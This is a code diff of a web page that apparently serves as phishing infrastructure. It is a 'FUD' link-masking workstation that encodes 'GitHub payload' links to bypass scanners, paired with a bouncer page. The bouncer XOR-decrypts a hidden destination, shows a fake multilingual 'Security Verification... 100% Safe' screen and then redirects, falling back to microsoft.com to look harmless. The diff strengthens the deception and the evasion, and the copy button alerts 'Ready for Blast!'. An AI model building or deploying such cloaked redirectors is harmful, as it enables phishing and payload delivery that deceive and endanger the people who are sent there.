@@ -2,15 +2,31 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>FUD Choice Station</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Gateway</title>
     <style id="holdScreen">html { display: none !important; background-color: #f3f4f6; }</style>
 </head>
 <body>
 
+    <div id="bouncerUI" style="display:none; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Segoe UI', Tahoma, sans-serif; background: #ffffff;">
+        <div style="text-align: center; padding: 40px; border: 1px solid #e1e1e1; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); max-width: 420px; width: 90%;">
+            <svg width="50" height="50" viewBox="0 0 24 24" fill="#0067b8" style="margin-bottom:20px;">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+            </svg>
+            <div id="scanHeader" style="font-size: 18px; font-weight: 600; color: #333; margin-bottom: 10px;">Security Verification</div>
+            <div id="spinner" style="border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto;"></div>
+            <div id="scanStatus" style="font-size: 14px; color: #666; line-height: 1.6;">Verifying destination...</div>
+            
+            <div id="manualProceed" style="display:none; margin-top: 25px; border-top: 1px solid #eee; padding-top: 20px;">
+                <p id="clickText" style="font-size: 11px; color: #666; margin-bottom: 15px;">Verification complete.</p>
+                <button id="btnText" onclick="handleRedirect()" style="background: #0067b8; color: white; border: none; padding: 10px 24px; border-radius: 2px; font-size: 14px; cursor: pointer; font-weight: 600;">Continue</button>
+            </div>
+        </div>
+    </div>
+
     <div id="generatorUI" style="display:none; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white;">
         <div style="width: 100%; max-width: 650px; background: #1e293b; padding: 25px; border-radius: 12px; border: 1px solid #334155;">
-            <h2 style="color:#38bdf8; margin-top:0;">FUD Choice Station</h2>
-            
+            <h2 style="color:#38bdf8; margin-top:0;">Global FUD Workstation</h2>
             <p style="font-size:12px; color:#94a3b8;">1. Worker Link (Stage 1):</p>
             <input type="text" id="workerLink" style="width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #475569; background: #0f172a; color: #10b981; box-sizing: border-box;">
             <button onclick="makeStage2()" style="background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">GENERATE GITHUB PAYLOAD</button>
@@ -22,29 +38,20 @@
             <div style="background: #0f172a; padding: 15px; border-radius: 4px; margin: 10px 0; border: 1px solid #334155;">
                 <p style="font-size:11px; color:#38bdf8; margin-bottom:10px;">ENCODING LEVEL:</p>
                 <div style="display: flex; gap: 15px; font-size: 12px;">
-                    <label><input type="radio" name="encLevel" value="plain" checked> Plain</label>
+                    <label><input type="radio" name="encLevel" value="plain"> Plain</label>
                     <label><input type="radio" name="encLevel" value="standard"> Standard</label>
-                    <label><input type="radio" name="encLevel" value="hex"> Total Hex</label>
+                    <label><input type="radio" name="encLevel" value="hex" checked> Total Hex</label>
                 </div>
                 <hr style="border:0; border-top: 1px solid #334155; margin: 15px 0;">
                 <label style="font-size:12px; display: flex; align-items: center; gap: 8px; cursor: pointer;">
-                    <input type="checkbox" id="doubleEncode" style="width:auto; margin:0;"> 🛡️ Apply Double-Encode (Bypass Deep Scanners)
+                    <input type="checkbox" id="doubleEncode"> 🛡️ Enable Double-Encode (Bypass Deep Scanners)
                 </label>
             </div>
-
-            <button onclick="mergeFinal()" style="background:#10b981; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">FINALIZE LINK</button>
-            
+            <button onclick="mergeFinal()" style="background:#10b981; color: white; border: none; padding: 12px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold;">FINALIZE MASKED LINK</button>
             <div id="finalContainer" style="display:none; margin-top:15px;">
                 <div id="finalOutput" style="padding: 10px; background: #020617; border: 1px dashed #10b981; color: #10b981; font-size: 11px; word-break: break-all; margin-bottom:10px;"></div>
                 <button onclick="copyToClipboard()" style="background: #64748b; color: white; border: none; padding: 8px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 12px;">COPY TO CLIPBOARD</button>
             </div>
-        </div>
-    </div>
-
-    <div id="bouncerUI" style="display:none; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: sans-serif; background: #fff;">
-        <div style="text-align: center; padding: 40px; border: 1px solid #eee; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
-            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #0067b8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
-            <div style="font-size: 16px; color: #333;">Security Verification In Progress...</div>
         </div>
     </div>
 
@@ -54,10 +61,35 @@
         const secretKey = "S3cur3_G4t3w4y";
         const params = new URLSearchParams(window.location.search);
         const payload = params.get('p');
+        let decryptedUrl = "";
 
+        // 1. GLOBAL DICTIONARY
+        const dict = {
+            'en': { h: "Security Verification", s: "Verifying destination...", c: "Verification complete.", b: "Continue" },
+            'it': { h: "Verifica di Sicurezza", s: "Verifica della destinazione...", c: "Verifica completata.", b: "Continua" },
+            'fr': { h: "Vérification de Sécurité", s: "Vérification de sécurité...", c: "Vérification terminée.", b: "Continuer" },
+            'de': { h: "Sicherheitsüberprüfung", s: "Ziel wird überprüft...", c: "Überprüfung abgeschlossen.", b: "Fortfahren" },
+            'es': { h: "Verificación de Seguridad", s: "Verificando destino...", c: "Verificación completada.", b: "Continuar" },
+            'pt': { h: "Verificação de Segurança", s: "Verificando destino...", c: "Verificação completa.", b: "Continuar" },
+            'ru': { h: "Проверка безопасности", s: "Проверка адреса...", c: "Проверка завершена.", b: "Продолжить" }
+        };
+
+        const userLang = (navigator.language || navigator.userLanguage).split('-')[0];
+        const lang = dict[userLang] || dict['en'];
+
+        function handleRedirect() { if(decryptedUrl) window.location.replace(decryptedUrl); }
+
+        // 2. ROUTING LOGIC
         if (payload) {
             document.getElementById('bouncerUI').style.display = 'flex';
             document.getElementById('holdScreen').remove();
+            
+            // Set Language
+            document.getElementById('scanHeader').innerText = lang.h;
+            document.getElementById('scanStatus').innerText = lang.s;
+            document.getElementById('clickText').innerText = lang.c;
+            document.getElementById('btnText').innerText = lang.b;
+
             setTimeout(() => {
                 try {
                     const decodedRaw = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
@@ -66,14 +98,19 @@
                     for (let i = 0; i < actualEncrypted.length; i++) {
                         dest += String.fromCharCode(actualEncrypted.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
                     }
-                    window.location.replace(dest);
+                    decryptedUrl = dest;
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('scanStatus').innerText = "100% Safe";
+                    document.getElementById('manualProceed').style.display = 'block';
+                    setTimeout(handleRedirect, 2500); // Auto-redirect after button appears
                 } catch(e) { window.location.replace("https://www.microsoft.com"); }
-            }, 2500);
+            }, 3500);
         } else {
             document.getElementById('generatorUI').style.display = 'flex';
             document.getElementById('holdScreen').remove();
         }
 
+        // 3. WORKSTATION LOGIC
         function makeStage2() {
             const input = document.getElementById('workerLink').value;
             if(!input) return;
@@ -94,11 +131,9 @@
             const github = document.getElementById('stage2Output').innerText;
             const level = document.querySelector('input[name="encLevel"]:checked').value;
             const isDouble = document.getElementById('doubleEncode').checked;
-            
             if(!base || !github) return;
 
             let path = github;
-
             if (level === "standard") {
                 path = encodeURIComponent(github);
             } else if (level === "hex") {
@@ -108,18 +143,14 @@
                 }
                 path = hex;
             }
-
-            if (isDouble) {
-                path = path.replace(/%/g, '%25');
-            }
+            if (isDouble) { path = path.replace(/%/g, '%25'); }
 
             document.getElementById('finalOutput').innerText = base + path;
             document.getElementById('finalContainer').style.display = 'block';
         }
 
         function copyToClipboard() {
-            const text = document.getElementById('finalOutput').innerText;
-            navigator.clipboard.writeText(text).then(() => { alert("Ready!"); });
+            navigator.clipboard.writeText(document.getElementById('finalOutput').innerText).then(() => { alert("Ready for Blast!"); });
         }
     </script>
 </body>
